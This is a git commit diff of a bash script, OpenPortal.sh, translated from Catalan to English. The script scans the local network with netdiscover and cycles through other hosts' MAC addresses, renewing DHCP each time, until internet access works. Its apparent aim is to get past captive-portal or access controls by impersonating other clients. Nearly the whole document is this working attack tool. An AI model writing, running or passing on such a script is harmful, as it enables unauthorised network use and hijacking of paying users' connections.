619e84308ce32674bc30d88a65fa96e1eba08b46
Fr3aknet <bittestings@gmail.com>
2014-06-17 16:15:20 +0200

    Update

--- OpenPortal.sh
+++ OpenPortal.sh
@@ -1,40 +1,56 @@
 #!/bin/bash
+##############################################
+
+# Author: Fr3aknet
+# Last modification: June 17, 2014
+
+# Bug - If you not put an interface with the network configuration.
+# Bug - Can not find a client on the network that has Internet.
+
+##############################################
+
 clear
-echo "En quina interficia vos operar?"
+echo "What interface do you work?"
 read interface
 
 clear
-#ip
-echo -n "Aquesta es la teva IP:"
+
+#IP
+echo -n "This is your IP address:"
 ip=`ifconfig |grep -n1 $interface|grep "inet addr"|cut -d' ' -f12|cut -d':' -f2`
 echo $ip
+
 #MAC
-echo -n "Aquesta es la teva MAC:"
+echo -n "This is your MAC address:"
 ifconfig |grep -n1 $interface|grep "HWaddr"|cut -d' ' -f11
 
 #MASCARA
 mask=0
 nextp=1
-echo -n "Aquesta es la teva MASCARA:"
+echo -n "This is your Subnet Mask:"
 ifconfig |grep -n1 $interface|grep Mask|cut -d' ' -f16|cut -d ':' -f2
 
 while [ $nextp -lt 4 ]
 do
-numk=`ifconfig |grep -n1 $interface|grep Mask|cut -d' ' -f16|cut -d ':' -f2|cut -d "." -f$nextp`
-binari=`echo "obase=2;$numk" | bc`
-bits=`echo $binari|grep -o "1"|grep -c "1"`
-mask=`expr $mask + $bits`
-nextp=`expr $nextp + 1`
+	numk=`ifconfig |grep -n1 $interface|grep Mask|cut -d' ' -f16|cut -d ':' -f2|cut -d "." -f$nextp`
+	binari=`echo "obase=2;$numk" | bc`
+	bits=`echo $binari|grep -o "1"|grep -c "1"`
+	mask=`expr $mask + $bits`
+	nextp=`expr $nextp + 1`
 done
+echo "CIDR notation is $mask"
 
-echo "Mask es $mask"
-
-#Part 2
+#Hosts de la xarxa
 rep=0
 next=3
+echo "Searching Hosts in the network"
 netdiscover -i $interface -P -r $ip/$mask > hosts
+
+#Suplentant identitats fins que tenim Internet
 while [ $rep -eq 0 ]
 do
+	clear
+	echo "Supplanting new identity"
 ###	nip=`cat hosts |tail -$next|head -1|cut -d' ' -f2`
 	nmac=`cat hosts |tail -$next|head -1|cut -d' ' -f6`
 	echo $nmac
@@ -44,14 +60,16 @@ do
 	dhclient -r $interface
 	dhclient $interface
 	sleep 1
+	clear
 	wget -q --delete-after google.com
+
+	#Comprovem si tenim Internet
 	if [ $? -ne 0 ];then
 		next=`expr $next + 1`
-		echo "next attempt"
+		echo "No Internet with this identity"
 	else
 		rep=1
-		echo "Ja tens Internet"
+		echo "You already have Internet"
 		rm hosts
 	fi
 done
-
